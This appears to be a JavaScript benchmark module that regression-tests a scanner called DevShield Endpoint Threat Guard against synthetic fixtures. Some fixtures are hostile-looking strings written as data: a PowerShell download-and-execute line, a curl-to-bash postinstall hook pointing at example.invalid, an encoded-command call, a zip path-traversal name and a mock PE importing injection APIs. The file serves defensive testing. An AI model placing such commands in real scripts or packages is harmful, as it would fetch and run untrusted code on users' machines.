// Safe, synthetic offline benchmark. No real malware, no downloads, no execution.
// This is NOT an antivirus detection-rate test or a cross-vendor speed comparison.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { performance } from 'node:perf_hooks';
import { scanEndpoint } from '../src/endpoint-shield.mjs';

function mockZipEntry(name, expanded = 100, compressed = 50) {
  const filename = Buffer.from(name);
  const size = 46 + filename.length;
  const bytes = Buffer.alloc(size + 22);
  bytes.writeUInt32LE(0x02014b50, 0);
  bytes.writeUInt32LE(compressed, 20);
  bytes.writeUInt32LE(expanded, 24);
  bytes.writeUInt16LE(filename.length, 28);
  filename.copy(bytes, 46);
  bytes.writeUInt32LE(0x06054b50, size);
  bytes.writeUInt16LE(1, size + 8);
  bytes.writeUInt16LE(1, size + 10);
  bytes.writeUInt32LE(size, size + 12);
  bytes.writeUInt32LE(0, size + 16);
  return bytes;
}
// Synthetic PE32 metadata, never a runnable binary; emulate suspicious imports.
function mockPE() {
  const b = Buffer.alloc(0xA00);
  b.write('MZ', 0);
  b.writeUInt32LE(0x80, 0x3c);
  b.write('PE\u0000\u0000', 0x80, 'latin1');
  b.writeUInt16LE(0x14c, 0x84);
  b.writeUInt16LE(2, 0x86);
  b.writeUInt16LE(224, 0x94);
  b.writeUInt16LE(0x10b, 0x98);
  b.writeUInt32LE(0x3000, 0x98 + 56);
  b.writeUInt32LE(0x200, 0x98 + 60);
  b.writeUInt16LE(16, 0x98 + 92);
  b.writeUInt32LE(0x2000, 0x98 + 96 + 8);
  b.writeUInt32LE(0x100, 0x98 + 96 + 12);
  const section = (at, name, va, rawAt, flags) => {
    b.write(name, at, 'ascii');
    b.writeUInt32LE(0x400, at + 8);
    b.writeUInt32LE(va, at + 12);
    b.writeUInt32LE(0x400, at + 16);
    b.writeUInt32LE(rawAt, at + 20);
    b.writeUInt32LE(flags, at + 36);
  };
  section(0x178, '.text', 0x1000, 0x200, 0xE0000020);
  section(0x178 + 40, '.idata', 0x2000, 0x600, 0x40000040);
  b.fill(0x90, 0x200, 0x600);
  b.writeUInt32LE(0x2060, 0x600);
  b.writeUInt32LE(0x2090, 0x600 + 12);
  b.writeUInt32LE(0x2060, 0x600 + 16);
  b.writeUInt32LE(0x20B0, 0x660);
  b.writeUInt32LE(0x20D0, 0x664);
  b.write('KERNEL32.dll\u0000', 0x690, 'latin1');
  b.write('WriteProcessMemory\u0000', 0x6B2, 'latin1');
  b.write('CreateRemoteThread\u0000', 0x6D2, 'latin1');
  return b;
}
export const cases = Object.freeze([
  { id: 'ordinary-js', expectation: 'no-indicators', file: 'safe.js',
    bytes: 'export const total = (a, b) => a + b;\n' },
  { id: 'ordinary-install-script', expectation: 'no-indicators', file: 'package.json',
    bytes: JSON.stringify({ name: 'benign-fixture', scripts: { preinstall: 'node scripts/setup.js' } }) },
  { id: 'encoded-powershell', expectation: 'finding', rule: 'powershell-encoded-command',
    file: 'snippet.ps1', bytes: 'powershell.exe -EncodedCommand QUJD\n' },
  { id: 'powershell-download-execution', expectation: 'finding', rule: 'powershell-download-and-execute',
    file: 'download.ps1', bytes: 'Invoke-WebRequest https://example.invalid/demo | iex\n' },
  { id: 'package-lifecycle-hook', expectation: 'finding', rule: 'lifecycle-download-and-execute',
    file: 'package.json',
    bytes: JSON.stringify({ scripts: { postinstall: 'curl https://example.invalid/setup.sh | bash' } }) },
  { id: 'synthetic-secret', expectation: 'finding', rule: 'github-token', file: '.env',
    bytes: 'GITHUB_TOKEN=ghp_' + 'X'.repeat(31) + '\n' },
  { id: 'zip-traversal-metadata', expectation: 'finding', rule: 'archive-path-traversal',
    file: 'archive.zip', bytes: mockZipEntry('../../escape.ps1') },
  { id: 'zip-expansion-metadata', expectation: 'finding', rule: 'archive-expansion-risk',
    file: 'archive.zip', bytes: mockZipEntry('large.txt', 100 * 1024 * 1024, 80) },
  { id: 'suspicious-pe32-metadata', expectation: 'finding', rule: 'pe-remote-process-injection-apis',
    file: 'synthetic.exe', bytes: mockPE() },
  { id: 'unsupported-malformed-pe', expectation: 'incomplete', file: 'broken.exe',
    bytes: Buffer.from([0x4d, 0x5a, 0, 0]) }
]);

export function runSyntheticBenchmark({ repeats = 3 } = {}) {
  assert.ok(Number.isSafeInteger(repeats) && repeats >= 1 && repeats <= 20, 'repeats must be 1..20');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'devshield-benchmark-'));
  const results = [];
  try {
    for (const fixture of cases) {
      const file = path.join(root, fixture.id, fixture.file);
      fs.mkdirSync(path.dirname(file), { recursive: true });
      fs.writeFileSync(file, fixture.bytes);
      const durations = [];
      let report = null;
      for (let i = 0; i < repeats; i++) {
        const start = performance.now();
        report = scanEndpoint(file);
        durations.push(performance.now() - start);
      }
      assert.ok(report, 'report must exist');
      const ids = new Set(report.findings.map(f => f.rule));
      let passed;
      if (fixture.expectation === 'no-indicators') {
        passed = report.complete && report.findings.length === 0;
      } else if (fixture.expectation === 'finding') {
        passed = report.complete && ids.has(fixture.rule);
      } else {
        passed = !report.complete && report.summary.status === 'incomplete';
      }
      durations.sort((a, b) => a - b);
      results.push({
        id: fixture.id,
        expectation: fixture.expectation,
        expectedRule: fixture.rule || null,
        passed,
        complete: report.complete,
        observedRules: [...ids].sort(),
        findings: report.findings.length,
        medianMilliseconds: Number(durations[Math.floor(durations.length / 2)].toFixed(3)),
        bytes: Buffer.byteLength(fixture.bytes)
      });
    }
    const failed = results.filter(x => !x.passed).map(x => x.id);
    return {
      schemaVersion: 1,
      type: 'synthetic-rule-regression-only',
      tool: 'DevShield native offline Endpoint Threat Guard',
      vendorComparisonPerformed: false,
      malwareDetectionRateMeasured: false,
      realMalwareSamplesUsed: false,
      clamAvEngineTested: false,
      guiTested: false,
      environment: {
        platform: process.platform, arch: process.arch,
        node: process.version, cpus: os.cpus().length,
        dateUtc: new Date().toISOString()
      },
      repetitionsPerFixture: repeats,
      fixtures: results.length, passed: results.length - failed.length,
      failed, results,
      limitations: [
        'Synthetic cases selected from known DevShield rules, not real-world malware.',
        'Per-fixture timings reflect only this runner and do not compare vendors.',
        'No EICAR file or real malware is created in this default benchmark.',
        'A passing fixture does not certify malware detection rates or absence of false positives.'
      ]
    };
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
}
export function markdownReport(report) {
  const rows = [
    '# DevShield endpoint synthetic regression',
    '',
    'Tested: ' + report.environment.dateUtc,
    'Environment: ' + report.environment.platform + '/' + report.environment.arch +
      ', Node ' + report.environment.node,
    'Passing cases: ' + report.passed + '/' + report.fixtures +
      ' (only known synthetic fixtures, NOT detection rate)',
    '',
    '| Fixture | Expected | Observed rules | Complete | Pass | Median ms |',
    '|---|---|---|---|---|---|'
  ];
  for (const c of report.results) {
    rows.push('| ' + c.id + ' | ' + (c.expectedRule || c.expectation) +
      ' | ' + (c.observedRules.join(', ') || 'none') +
      ' | ' + c.complete + ' | ' + (c.passed ? 'yes' : 'NO') +
      ' | ' + c.medianMilliseconds + ' |');
  }
  rows.push('', '**Limitations:** ' + report.limitations.join(' '));
  return rows.join('\n');
}
// Only run the CLI main when invoked directly. The deterministic test suite imports this module.
const entry = process.argv[1] ? path.resolve(process.argv[1]) : null;
const source = new URL(import.meta.url).pathname;
if (entry && entry === path.resolve(source)) {
  const args = process.argv.slice(2);
  if (args.some(a => a !== '--json')) {
    console.error('Usage: node benchmark/endpoint-synthetic.mjs [--json]');
    process.exitCode = 2;
  } else {
    const report = runSyntheticBenchmark();
    console.log(args.includes('--json') ? JSON.stringify(report, null, 2) : markdownReport(report));
    if (report.failed.length > 0) process.exitCode = 1;
  }
}
